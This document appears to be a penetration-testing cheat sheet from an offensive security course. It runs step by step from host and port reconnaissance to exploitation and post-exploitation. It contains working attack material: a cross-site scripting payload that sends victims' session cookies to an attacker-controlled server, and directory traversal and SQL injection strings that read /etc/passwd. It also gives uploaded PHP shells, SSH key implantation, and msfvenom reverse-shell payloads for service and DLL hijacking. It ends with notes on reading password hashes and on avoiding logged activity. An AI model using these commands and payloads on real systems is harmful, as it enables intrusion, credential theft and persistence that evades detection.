**1 Recon** {
#1.1 Host Discovery
		Linux: for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
		Windows: for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
 
#1.2 Port Enumeration 
		nmap -sS -Pn <IP> -p 135-139,22,80,443,21,8080 
		nc -z -v -w 1 <IP> 440-443
#1.3 Port Interrogation
		nc -Cv <IP> 80
			GET / HTTP/1.0
		nmap -sV <IP> -p <port> (Service Version Enum)
		nikto -h <IP> -p <port> (nikto vuln scan)
#1.4 Solid nmap scripts
		--script= 
		dns-brute.nse
		hostmap-bfk.nse
		traceroute-geolocation.nse
		http-enum
		http-robots.txt
		--script-args http-enum.basepath='<Web Server Dir/>' <IP Address>
		smb-os-discovery -> USE FOR WINDOWS
#1.5 Web Service enumeration (for every web page on site:)
		interact with webpage correctly, see whole page, view source
		look for js functions to abuse
		look for robots.txt (what google looks at) (for web crawler) 
			NSE and nikto (burp outside of class)
			nmap -Pn -T5 <IP> -p <HTTP Port> --script=http-robots.txt
			go to robots.txt with firefox	
}
**2 Initial Exploitation** {
#2.1 HTTP/Web Exploitation 
	2.1.0 Cross site scripting 
		test input fields for unsanitized input
			<script>alert("hacked")</script>
		for unsanitized input fields
			start simplehttpserver (3.1)
			 <script>document.location="http://<OPS station IP>:8000/Cookie_Stealer1.php?username=" + document.cookie;</script> (steals user session cookies)
	2.1.1 Directory Traversal
		view_image.php?file=../../../../../../etc/passwd
		view_image.php?file=../../../../../../etc/hosts	
		for passwd copy and paste into text file and grep /bin/bash to get users
		for hosts, can help with networking, maybe looking for other subnets
	2.1.2 Malicious File Upload
		Server doesnt validate extension or size
		/var/www/html -default http server directory
		upload php shell script (mal.php)
		find and call file once uploaded
			look at robots.txt, look for uploads folder
		Useful commands after you exploit - situational awareness
			whoami
			cat /etc/passwd | grep <username>
			netstat -antup
			ls -la /var/www/html -catches things robots.txt might have missed
		2.1.2.1 Getting an SSH login on web service user 
			on ops-station
				ssh-keygen -t rsa -b 4096
				copy public key 
					cat /root/.ssh/id_rsa.pub
			on victim
				mkdir <home dir>/.ssh
				echo "<RSA key>" ><home dir>/.ssh/authorized_keys			
				cat <home dir>/.ssh/authorized_keys		
			on ops-station
				ssh <web service user>@<victim IP>	
	2.1.3 Command injection
		if site has option to do a ping or something
		testing
			; ls -la (in input box)
		can do rsa key injection just like with having the php script
#2.2 SQL Injection
	2.2.1 Starting point
		interact with site correctly
		test sanitization
			' in input field
			   TOM'OR 1='1
			OR 1=1 in GET statement
		check how many colums in table		
			UNION SELECT 1,2,@@version
		exploit with golden statement to check all of the tables, dbs, and columns
			union select table_schema,column_name,table_name from information_schema.columns;
			union select 1,2,LOAD_FILE('/etc/passwd') -can read files
#2.3 Exploit Development
	2.3.1 ELF Buffer Overflows
		-Find non-bounded input fields with gdb (looking for gets or something in red with pdisass)
		-Test Program with non-standard inputs to find if can be broken 
		-test buffer with buffer overflow pattern generator (wiremask)
		-find offset of target register
		-put offset into skel script
		gdb: r <<<$(python skel.py)
			-run script with random inputs to verify in correct register	
		-edit script to target register with possible shellcode (nop sleds, etc.) 		
		 env - gdb (binary)
		 	unset env LINES
			unset env COLUMNS
			show env
			r - crash program (long string to get past bounds)
			info proc map
			find /b <first mem addr of heap> , <last mem addr before stack> , 0xff , 0xe4 (jmp esp)
			-copy first 3 addrs
			-put top of stack little endian into eip in script
		msfconsole
			use payload/linux/x86/exec
			set CMD (whatever you want)
			generate -b "\x00\x0a\x0d" -f python
		put payload into script
		after upload to remote host
			do env - gdb (binary again) 	
	2.3.2 Windows Exploit Development 
		Open Immunity Debugger
		!mona to make sure mona is installed
		Remote Buffer Overflow
			-on linux box
				make skeleton script with code provided
				set socket to correct ip/port
			-on win box
				run secserv in immunity
				watch as script runs against secserv, wait for it to crash and pause
			-on lin box 
				run script
			-Use mona to find EIP Offset
				!mona pc <number>
				!mona findmsp
			-use mona to generate test for bad chars
				!mona bytearray
				drop badchars into script
			-Use Mona to find jmp esp in the dll function
				!mona jmp -r esp -m "essfunc.dll"
			-Generate Payload 
			msfconsole
				use windows/shell_reverse_tcp
				set EXITFUNC=thread -b "\x00" -f c
				set LHOST <Your Host IP>
				set LPORT <listening port>
				generate -b "\x00" -f python
			copy and paste output into script
			nc -lvp <your port>
			run script against server again	

}
**3 Post Exploitation** 
#3.1 Local Host Enumeration 
	3.1.1 Windows
		net user #check user permissions, groups
		tasklist		#Currently running Processes
		tasklist /svc		#Currently running Services
		ipconfig /all
		route print
		dir /a:h	
		dir /o:d	#Order by date
		dir /t:w 
		schtasks
	3.1.2 Linux
		uname -a	#shows kernel version
		cat /etc/hosts  #check hostname->ip
		cat /etc/passwd #check user groups, home dir, shell, etc
		cat /etc/groups 
		(if you have access to root) cat /etc/shadow, john file to get plaintext passwords
		ps -elf #Look for non-standard processes, ssh sessions, servers
		chkconfig 			#SysV 
		systemctl --type=service	#SystemD
		ip a 
		find / -type f -name "cron" 2>/dev/null # Looks for cron
		date	#checking timezones 
		time
		id	#check groups
		sudo -l	#checks what you have root privleges to
		w 		#checks whos logged in
		last 		#when they logged in
		uptime		#check how long the machine has been up
		arp -a 	#check arp cache, very unreliable passive enum
		cat /etc/rsyslog.d/*	#check where logs are stored
		ls /var/spool/cron/contabs	#check cron jobs
		ls -la /tmp
		3.1.2.1 Stealing SSH Tokens
			look for backups in /tmp, 
			
3.2 Linux Post Exploitation
	3.2.1 Privilege Escelation
		sudo -l
		cat /etc/sudoers
		gtfobins for binaries you have access to
		SUID/SGID
			find / -type f -perm /4000 -ls 2>/dev/null
			find / -type f -perm /6000 -ls 2>/dev/null
	3.2.2 Persistence
		Making a User - useradd
		
	
3.3 Windows Post Exploitation
	3.3.1 Service Exploitation
		#Service Enum
			services.msc(Look for Blank Service Description)
			for /f "tokens=2 delims='='" %a in ('wmic service list full^| find /i "pathname'^|find /i /v "system32"') do @echo %a
			wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findsttr /i /v "C:\windows\\" |findstr /i /v """
			sc qc <service name>	
			icacls "<service binary>"
		#Service Exploitation
			rename service binary to something else
			msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f exe > <bin name>.exe
			put mal exe in binary location
			restart victim computer
			nc -lvp 4444
			net start <Service name>
	3.3.2 DLL Hijacking
		#Check Scheduled Tasks
			gui:Task Sched
			powershell:schtasks /query /fo LIST /v | Select-String -Pattern "Task to Run" | find /i /v "com handler"
				-try to find and exploit 3rd party programs
				-stop looking when you hit system32
		#Check Processes 
			tasklist /v | find /i "file"
				-there is no secret to finding malicious processes
				-taking baselines and all that
			query session 
				-Think about what session the task might be running in
				-Watch for session 0 for 3rd party processes
			wmic process get name,processid,parentprocessid,sessionid
				-look for parent process
				-look for everything that process is doing
			wmic process where (processid=<PPID>) list full
				look at Commandline, Description, ExecutablePath
				if svchost
					tasklist /svc | findstr /i "<PPID>"
			cd C:/
			where /R c:\ <app name>
		#DLL HIJACKING
			procmon /AcceptEula
			run <Binary>
				ProcessName = putty.txt
				Path contains .dll
				Result is "NAME NOT FOUND"
					find a .dll to exploit that is being called
			do the injection
				EASY WAY
					ops-station: msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f dll > bad.dll
				HARD WAY
					ops-station: nano bad.c 
					copy code from file, put commands in that you want
					apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y
					i686-w64-mingw32-g++ -c bad.c -o bad.o
					i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a
			transfer the DLL
				ops-station: python -m SimpleHTTPServer 8000
					base64 bad.dll > base64dll.txt
				victim: http://<ops-station-ip>:8000
					copy/paste txt into new .txt file 
					move base64.txt base64
					certutil -decode base64 <INJECTDLL>.dll
					put dll in same location as vuln exe
						copy "<INJDLLPATH>" "VULNEXEPATH"
	3.3.3 Checking For Persistence
		HKLM/run|runonce
		HKCU/run|runonce
		
		
#3.4 Covering Tracks - Windows
	3.4.1 Auditpol -can only be run from elevated cmd prompt
		auditpol /get /category:*
		auditpol /get /category:* |findstr /i "success failure"
		auditpol /list /subcategory:"detailed Tracking","DS Access"
		auditpol /get /option:crashonauditfail
	3.4.2 Event Logging
		logs are located in C:\Windows\system32\config
		logs in data/xml datatype
		types of logs
			application log - Events logged by apps, errors, etc
			security log - Logon Attempts, resource/object use
			setup log - application setup
			System log - driver failures and application crashes, service creation
		important event IDs 
			4624/4625 - Success/Fail login 
			4720 - Account Created
			4672 - Admin user login
			7045 - Service Creation
			
		WMIC 
			logs stored in %systemroot%\system32\wbem\Logs
			reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
		Powershell logging - never use powershell
			2.0 - little evidence
			3.0+ - Module Logging
			powershell -command "$psversiontable"
			
			
